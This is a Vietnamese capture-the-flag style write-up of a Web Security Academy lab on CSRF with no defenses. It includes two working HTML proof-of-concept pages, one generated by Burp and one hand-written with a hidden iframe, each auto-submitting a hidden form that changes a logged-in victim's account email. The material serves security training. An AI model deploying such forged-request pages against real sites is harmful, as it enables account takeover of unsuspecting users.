# CSRF vulnerability with no defenses

### Yêu cầu: Tạo thẻ HTML để tấn công CSRF thay đổi email của tài khoản người dùng

### Hướng làm: 

Đầu tiên, ta đăng nhập vào tài khoản mà đề bài đã cho `weiner:peter`

Tiếp đến chúng ta sẽ bắt request của chức năng đăng nhập bằng BurpSuite

![image](https://user-images.githubusercontent.com/72268643/157409274-bddd16d6-d281-41e0-b446-5b87df7e372e.png)

Sau khi gửi tới Repeater, ta thấy rằng việc thay đổi này chỉ yêu cầu mỗi param email chứ không có CSRF token để xác thực

![image](https://user-images.githubusercontent.com/72268643/157410346-4caf3deb-6af4-48ea-90b7-aaaebe3a5ad6.png)

Vậy nên ta đã có đủ điều kiện tấn công (thay đổi email, phiên user, không có param trống)

Chúng ta có thể sử dụng công cụ `Generate CSRF PoC` của BurpSuitePro để sinh ra 1 đoạn code HTML để upload luôn trên server

![image](https://user-images.githubusercontent.com/72268643/157411439-88742410-2c8c-402b-ac62-000486524e94.png)

Sau đó ta copy đoạn HTML ở dưới rồi gửi lên phía server nạn nhân

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ace11f521f4b1b0fc0623988009700c5.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="victim&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Hoặc chúng ta có thể tự viết PoC theo cách sau:
```
<html>
  <body>
    <h1>Hello World</h1> <!-- Phần được hiển thị -->
    <iframe style="display:none;" name="csrf-iframe"></iframe> <!-- Để ẩn thẻ form khi hiển thị tới nạn nhân -->
    <form action="nơi_khai_thác_CSRF_ở_trên_trang_web_đó" method="post" id="csrf-form">
      <input type="hidden" name="email" value="email_mà_bạn_muốn_đổi">
    </form>

    <script>document.getElementById("csrf-form").submit()</script> <!-- Phần tự submit form thực thi -->
  </body>
</html>
```

![image](https://user-images.githubusercontent.com/72268643/157412962-53524799-b782-47ee-a863-8419e3c3e21a.png)

Store và hoàn thành lab
